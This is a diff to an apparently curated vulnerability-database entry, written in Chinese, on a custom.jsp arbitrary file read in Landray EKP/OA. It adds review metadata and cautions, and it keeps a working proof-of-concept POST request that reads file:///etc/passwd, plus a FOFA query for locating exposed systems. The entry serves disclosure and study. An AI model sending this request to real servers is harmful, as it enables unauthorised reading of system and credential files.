@@ -1,11 +1,51 @@
 ---
-
 source: "MrWQ/vulnerability-paper"
+title: "蓝凌EKP custom.jsp文件读取"
+product: "蓝凌EKP"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_status: "unknown"
+affected_scope: "版本未知；Linux file://示例"
+prerequisites: "脚本无Cookie，实际认证未知"
+side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
+review_date: "2026-10-02"
+source_url: "https://mp.weixin.qq.com/s/TkUZXKgfEOVqoHKBr3kNdw"
+source_status: "recorded"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E8%93%9D%E5%87%8COA/%E8%93%9D%E5%87%8C%20OA%20custom-jsp%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
+fofa: "app=\"Landray-OA系统\""
+id: "vw-a75d0c4f105b13da5910979e"
+entity_id: "ve-a75d0c4f105b13da5910979e"
+schema_version: "1"
 ---
 
-# 蓝凌 OA custom-jsp 任意文件读取漏洞
+# 蓝凌EKP custom.jsp文件读取
 
-<meta name="referrer" content="no-referrer"/>
+## 条目说明
+
+- 对象与具体问题：蓝凌EKP；custom.jsp文件读取
+- 版本、配置及部署条件：版本未知；Linux file://示例
+- 认证与权限前提：脚本无Cookie，实际认证未知
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- 与蓝凌custom.jsp及凌OA链前段同漏洞，需保留file://与应用相对路径差异
+- JSON结尾\}为转码坏字符，Python仍会发送反斜线，不能作为有效请求
+- 仅root:单词匹配可能误报，应完整文件结构对照；无修复版本
+- 长广告段可裁保留来源/版权
+
+## 操作风险
+
+现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
+
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/TkUZXKgfEOVqoHKBr3kNdw)
 
 ![](https://mmbiz.qpic.cn/mmbiz_gif/ibicicIH182el5PaBkbJ8nfmXVfbQx819qWWENXGA38BxibTAnuZz5ujFRic5ckEltsvWaKVRqOdVO88GrKT6I0NTTQ/640?wx_fmt=gif)
@@ -28,16 +68,17 @@ FOFA:  app="Landray-OA系统"
 
 **出现漏洞的文件为 custom.jsp,** **请求包为**
 
-```
+```http
 POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
 Host:
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
-Content-Length: 42
 Content-Type: application/x-www-form-urlencoded
 Accept-Encoding: gzip
 
 var={"body":{"file":"file:///etc/passwd"\}\}
 ```
+
+> 请求长度说明：原资料 Content-Length 为 42；静态长度已移除，应由客户端根据最终请求体的字节数生成。
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7UGicsjEf95CAW6nYx9fytsIIwlib5jbcTwsHbwv6bafvbQ0aib8bcrCX6memWRmAsZjZ3qs9eFCnEQ/640?wx_fmt=png)
 
